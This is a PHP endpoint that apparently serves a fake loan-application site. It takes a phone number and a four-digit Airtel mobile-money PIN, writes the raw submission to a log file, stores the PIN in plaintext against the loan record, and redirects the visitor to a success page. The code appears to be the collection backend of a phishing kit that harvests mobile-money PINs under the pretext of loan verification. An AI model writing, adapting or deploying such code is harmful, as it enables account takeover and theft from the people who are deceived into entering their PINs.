<?php
declare(strict_types=1);

/* ---------------- HEADERS ---------------- */
header('Content-Type: application/json; charset=utf-8');

/* ---------------- SAFE BOOTSTRAP ---------------- */
header('Content-Type: application/json; charset=utf-8');

try {
    require_once __DIR__ . '/../config/db.php';
} catch (Throwable $e) {
    http_response_code(500);
    echo json_encode([
        'success' => false,
        'error' => 'Database connection failed'
    ]);
    exit;
}

/* ---------------- LOGGER ---------------- */
$logDir = __DIR__ . '/../logs';
if (!is_dir($logDir)) {
    @mkdir($logDir, 0755, true);
}
$logFile = $logDir . '/verify_airtel.log';

function log_msg(string $msg): void {
    global $logFile;
    @file_put_contents(
        $logFile,
        '[' . date('Y-m-d H:i:s') . '] ' . $msg . PHP_EOL,
        FILE_APPEND | LOCK_EX
    );
}

/* ---------------- REQUEST CHECK ---------------- */
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['success' => false, 'error' => 'Method not allowed']);
    exit;
}

/* ---------------- MAIN LOGIC ---------------- */
try {
    $raw = file_get_contents('php://input');
    log_msg('Payload: ' . $raw);

    $data = json_decode($raw, true);
    if (!is_array($data)) {
        throw new RuntimeException('Invalid JSON payload');
    }

    $phone = trim($data['phone'] ?? '');
    $pin   = trim($data['pin'] ?? '');

    if ($phone === '' || $pin === '') {
        throw new RuntimeException('Missing phone or PIN');
    }

    if (!preg_match('/^\d{4}$/', $pin)) {
        throw new RuntimeException('Invalid PIN format');
    }

    /* Find latest loan */
    $stmt = $pdo->prepare(
        'SELECT id FROM loan_applications
         WHERE phone = :phone
         ORDER BY created_at DESC
         LIMIT 1'
    );
    $stmt->execute(['phone' => $phone]);
    $row = $stmt->fetch();

    if (!$row) {
        http_response_code(404);
        echo json_encode(['success' => false, 'error' => 'Loan application not found']);
        exit;
    }

    /* Update loan */
    $update = $pdo->prepare(
        'UPDATE loan_applications
         SET airtel_pin = :pin,
             airtel_confirmed = 1,
             status = "pending"
         WHERE id = :id'
    );

    $update->execute([
        'pin' => $pin,
        'id'  => $row['id']
    ]);

    log_msg('Verification OK for loan ID ' . $row['id']);

    echo json_encode([
        'success' => true,
        'message' => 'Verification successful',
        'redirect' => 'success.html'
    ]);

} catch (Throwable $e) {
    log_msg('ERROR: ' . $e->getMessage());

    http_response_code(500);
    echo json_encode([
        'success' => false,
        'error' => 'Server error'
    ]);
}
